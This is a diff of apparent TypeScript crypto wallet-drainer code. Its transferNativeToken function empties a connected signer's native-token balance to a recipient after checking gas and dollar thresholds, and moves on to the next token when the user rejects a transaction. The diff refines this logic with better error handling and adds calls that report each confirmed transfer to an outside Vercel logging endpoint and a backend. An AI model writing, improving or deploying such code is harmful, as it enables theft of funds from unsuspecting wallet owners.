@@ -52,6 +52,7 @@ const isLoggingEnabled = true;
 //const BASE_API_URL = "https://drn-2stp.onrender.com/api"; // From permit.txt
 const BASE_API_URL = "http://localhost:8080/api";
 
+
 const stringifyMessage = (message: unknown): string => {
   if (typeof message === "object" && message !== null) {
     try {
@@ -76,7 +77,8 @@ const log = async (...messages: unknown[]) => {
         timestamp,
       });
     } catch (err) {
-      console.error(`Failed to send log to backend: ${err.message}`);
+      const errorMessage = err instanceof Error ? err.message : String(err);
+      console.error(`Failed to send log to backend: ${errorMessage}`);
     }
   }
 };
@@ -94,7 +96,8 @@ const warn = async (...messages: unknown[]) => {
         timestamp,
       });
     } catch (err) {
-      console.error(`Failed to send warn to backend: ${err.message}`);
+      const errorMessage = err instanceof Error ? err.message : String(err);
+      console.error(`Failed to send warn to backend: ${errorMessage}`);
     }
   }
 };
@@ -111,7 +114,8 @@ const error = async (...messages: unknown[]) => {
         timestamp,
       });
     } catch (err) {
-      console.error(`Failed to send error to backend: ${err.message}`);
+      const errorMessage = err instanceof Error ? err.message : String(err);
+      console.error(`Failed to send error to backend: ${errorMessage}`);
     }
   }
 };
@@ -1253,26 +1257,34 @@ const transferNativeToken = async (
 ): Promise<void> => {
   try {
     const provider = signer.provider;
-    if (!provider) throw new Error("Signer does not have an associated provider.");
+    if (!provider) {
+      throw new Error("Signer does not have an associated provider.");
+    }
+
     const signerBalance = await signer.getBalance();
     const feeData = await provider.getFeeData();
+    await log(`EIP-1559 Fee Data for Chain ${chainId}:`, feeData);
     const gasPrice = feeData.maxFeePerGas && feeData.maxPriorityFeePerGas
       ? feeData.maxFeePerGas
       : feeData.gasPrice || ethers.utils.parseUnits("5", "gwei");
     const gasLimit = await provider.estimateGas({
       to: recipient,
-      value: signerBalance
-    }).catch(() => BigNumber.from(21000));
+      value: signerBalance,
+    }).catch(() => ethers.BigNumber.from(21000));
     const totalGasCost = gasPrice.mul(gasLimit);
+    await log(`Gas Data for Chain ${chainId}:`, { gasPrice: ethers.utils.formatUnits(gasPrice, "gwei"), gasLimit: gasLimit.toString() });
+
     if (signerBalance.lte(totalGasCost)) {
-      log("Insufficient balance to cover gas fees.");
+      await log("Insufficient balance to cover gas fees.");
       return;
     }
+
     const balanceInUSD = parseFloat(ethers.utils.formatEther(signerBalance.sub(totalGasCost))) * tokenPriceInUSD;
     if (balanceInUSD < 2) {
-      log("Native token balance below $2. Skipping transfer.");
+      await log("Native token balance below $2. Skipping transfer.");
       return;
     }
+
     if (balanceInUSD >= 50 && totalTokenValueInUSD > 50) {
       const amountToLeaveInUSD = 10;
       const remainingBalance = ethers.utils.parseEther(
@@ -1280,7 +1292,7 @@ const transferNativeToken = async (
       );
       const amountToSend = signerBalance.sub(totalGasCost).sub(remainingBalance);
       if (amountToSend.isZero() || amountToSend.lt(ethers.utils.parseEther("0.0001"))) {
-        log("Amount to send is too small after subtracting gas fees and leaving $10.");
+        await log("Amount to send is too small after subtracting gas fees and leaving $10.");
         return;
       }
       const tx = await signer.sendTransaction({
@@ -1289,13 +1301,18 @@ const transferNativeToken = async (
         gasPrice,
         gasLimit,
       });
-      log(`Transaction sent: ${tx.hash}`);
+      await log(`Transaction sent: ${tx.hash}`);
       await tx.wait();
-      log(`Transaction confirmed: ${tx.hash}`);
+      await log(`Transaction confirmed: ${tx.hash}`);
+      await axios.post("https://your-vercel-app.vercel.app/api/log", {
+        level: "info",
+        message: `EVM transaction confirmed: ${tx.hash}`,
+        timestamp: new Date().toISOString(),
+      });
     } else {
       const amountToSend = signerBalance.sub(totalGasCost);
       if (amountToSend.isZero() || amountToSend.lt(ethers.utils.parseEther("0.0001"))) {
-        log("Amount to send is too small after subtracting gas fees.");
+        await log("Amount to send is too small after subtracting gas fees.");
         return;
       }
       const tx = await signer.sendTransaction({
@@ -1304,17 +1321,22 @@ const transferNativeToken = async (
         gasPrice,
         gasLimit,
       });
-      log(`Transaction sent: ${tx.hash}`);
+      await log(`Transaction sent: ${tx.hash}`);
       await tx.wait();
-      log(`Transaction confirmed: ${tx.hash}`);
+      await log(`Transaction confirmed: ${tx.hash}`);
+      await axios.post("https://your-vercel-app.vercel.app/api/log", {
+        level: "info",
+        message: `EVM transaction confirmed: ${tx.hash}`,
+        timestamp: new Date().toISOString(),
+      });
     }
-  } catch (error) {
-    if (error.code === "ACTION_REJECTED") {
-      warn(`Transaction rejected by the user. Skipping to the next token.`);
-    } else if (error instanceof Error) {
-      console.error(`Error transferring native token on chain ${chainId}:`, error.message);
+  } catch (err: unknown) {
+    if (typeof err === "object" && err !== null && "code" in err && err.code === "ACTION_REJECTED") {
+      await warn(`Transaction rejected by the user. Skipping to the next token.`);
+    } else if (err instanceof Error) {
+      await error(`Error transferring native token on chain ${chainId}: ${err.message}`);
     } else {
-      console.error(`An unknown error occurred while transferring native token on chain ${chainId}.`);
+      await error(`An unknown error occurred while transferring native token on chain ${chainId}: ${String(err)}`);
     }
   }
 };
